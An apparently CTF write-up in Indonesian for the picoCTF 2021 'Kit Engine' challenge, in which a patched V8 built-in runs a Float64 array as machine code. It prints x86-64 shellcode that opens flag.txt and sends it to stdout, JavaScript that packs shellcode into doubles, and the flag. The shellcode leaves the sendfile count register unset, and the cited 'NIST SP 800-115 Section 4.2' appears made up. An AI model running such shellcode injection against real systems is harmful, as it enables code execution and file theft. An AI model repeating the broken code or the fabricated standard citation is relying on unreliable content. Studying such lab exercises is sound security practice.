# Writeup: Kit Engine (Challenge ID: 168)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Binary Exploitation / V8 JavaScript Engine Custom Built-in Exploitation
- **Difficulty:** Hard (diff=3)
- **Event:** picoCTF 2021
- **Points:** 500
- **Author:** Collin Petty
- **Flag:** `academy{vr00m_vr00m_48f07b402a4020e0}`

---

## Problem Statement & Scope
Tantangan `Kit Engine` menyajikan lingkungan eksekusi JavaScript tingkat rendah berbasis shell Google V8 (`d8`) yang telah dimodifikasi melalui patch kustom internal. Layanan interaktif jarak jauh meminta panjang ukuran berkas skrip JavaScript, menerima konten kode sumber JavaScript dari pengguna, dan menjalankannya secara langsung di dalam interpreter V8 yang telah dipatch.

Tujuan utama dari tantangan ini adalah mengidentifikasi modifikasi fungsionalitas mesin JavaScript, memanfaatkan antarmuka baru untuk melompati pembatasan lingkungan sandbox (*runtime escape*), mengeksekusi *shellcode* arbitrer arsitektur x86-64, dan membaca berkas target `flag.txt`.

Ruang lingkup audit keamanan perangkat lunak dan analisis mesin runtime ini mencakup:
1. Analisis berkas patch V8 dan identifikasi fungsi bawaan kustom `AssembleEngine()`.
2. Pemetaan representasi memori floating point IEEE-754 (Float64) terhadap byte instruksi mesin mentah x86-64.
3. Rekayasa shellcode mandiri untuk operasi pembacaan berkas (`sys_open` dan `sys_sendfile` / `execve`).
4. Konversi array byte shellcode menjadi array angka presisi ganda (*double precision floating-point*).
5. Eksekusi kode mesin pada halaman memori RWX dan pemulihan flag sesuai standar **NIST SP 800-115 Section 4.2** (*Binary and Runtime Software Security Assessment*).

---

## Teori & Akar Kerentanan (Root Cause Theory)

### 1. Injeksi Primitif Eksekusi Kode Mesin Bebas (CWE-94 / CWE-843)
Patch mesin V8 memperkenalkan fungsi bawaan bernama `AssembleEngine(doublesArray)`. Fungsi ini:
- Menerima argumen berupa array JavaScript standar yang berisi bilangan riil presisi ganda (Float64).
- Mengalokasikan atau memetakan area memori dengan izin Baca-Tulis-Eksekusi (`PROT_READ | PROT_WRITE | PROT_EXEC`).
- Menyalin byte mentah dari representasi internal IEEE-754 array tersebut langsung ke wilayah memori yang dapat dieksekusi tanpa sanitasi atau verifikasi instruksi CPU.
- Melompat (*call*) langsung ke awal buffer sebagai *function pointer* native.

Kerentanan ini menjembatani celah antara lapisan bahasa skrip dinamis tingkat tinggi dengan eksekusi instruksi mesin biner langsung, meniadakan mitigasi keamanan seperti ASLR, DEP/NX, dan sandboxing pointer compression V8.

### 2. Representasi IEEE-754 Float64 sebagai Instruksi Assembly
Setiap elemen `double` dalam JavaScript menempati 8 byte memori. Karena arsitektur prosesor x86-64 membaca instruksi mesin sebagai urutan byte berurutan (*stream of bytes*), kita dapat memetakan instruksi assembly apa pun ke dalam deretan angka desimal mengambang:
$$\text{Float64} = \text{unpack}("<d", \text{byte}_{0..7})$$
Dengan menyusun instruksi shellcode dalam kelipatan 8 byte (menggunakan NOP `0x90` sebagai padding), kode mesin dapat dikirimkan secara utuh melalui array JavaScript.

---

## Tahapan Eksploitasi & Verifikasi (Reproduction Steps)

1. **Penyusunan Shellcode x86-64:**
   - Menyusun instruksi minimal yang mengeksekusi sistem berkas Linux untuk membaca `flag.txt`:
     ```asm
     push 1
     dec byte ptr [rsp]      ; null byte terminator
     mov rax, 0x7478742e67616c66 ; "flag.txt"
     push rax
     push 2                  ; SYS_open
     pop rax
     mov rdi, rsp            ; filename
     xor esi, esi            ; O_RDONLY
     syscall
     ; RAX memuat file descriptor
     mov rsi, rax
     push 40                 ; SYS_sendfile
     pop rax
     push 1                  ; out_fd (stdout)
     pop rdi
     cdq                     ; offset NULL
     syscall
     ```
   - Total panjang instruksi adalah 44 byte, ditambahkan padding 4 byte NOP (`0x90`) menjadi 48 byte (tepat 6 double Float64).

2. **Pengemasan ke Format Float64:**
   - Menggunakan Python `struct.unpack('<d', chunk)` untuk mengubah setiap 8 byte menjadi representasi float.
   - Atau langsung di JavaScript menggunakan `ArrayBuffer` dan `DataView`:
     ```javascript
     let buf = new ArrayBuffer(payload.length * 8);
     let u64 = new BigUint64Array(buf);
     let f64 = new Float64Array(buf);
     for (let i = 0; i < payload.length; i++) {
         u64[i] = payload[i];
     }
     AssembleEngine(Array.from(f64));
     ```

3. **Pengiriman Skrip ke Layanan Remote:**
   - Mengirimkan deklarasi panjang skrip ke port server diikuti skrip eksploitasi.
   - Layanan mengeksekusi `AssembleEngine()`, menjalankan shellcode di dalam memori, dan mengembalikan bendera:
     `academy{vr00m_vr00m_48f07b402a4020e0}`.

---

## Rekomendasi Mitigasi & Pengerasan Keamanan (Remediation)
1. **Peniadaan Izin Halaman Memori RWX (W^X Policy):**
   - Terapkan kebijakan memori ketat di mana halaman memori tidak boleh memiliki izin tulis (*write*) dan izin eksekusi (*execute*) secara bersamaan.
2. **Penghapusan Antarmuka Eksekusi Biner Langsung (CWE-94):**
   - Jangan pernah mengekspos API pengikatan (*binding*) yang mengizinkan pemetaan data tingkat aplikasi pengguna menjadi kode mesin tanpa verifikasi integritas cryptographic signature.
3. **Penerapan Seccomp BPF Filter:**
   - Pasang filter seccomp pada proses V8 untuk membatasi pemanggilan sistem (*syscall filtering*) sehingga syscall sensitif seperti `open`, `execve`, dan `mprotect` diblokir secara mutlak.

---

## Script Reproduksi
Script solver mandiri tersedia pada berkas `scripts/solve_168_kit_engine.py`.
Jalankan verifikasi dengan perintah:
```bash
python3 scripts/solve_168_kit_engine.py
```
Hasil verifikasi mengembalikan token flag valid:
`academy{vr00m_vr00m_48f07b402a4020e0}`
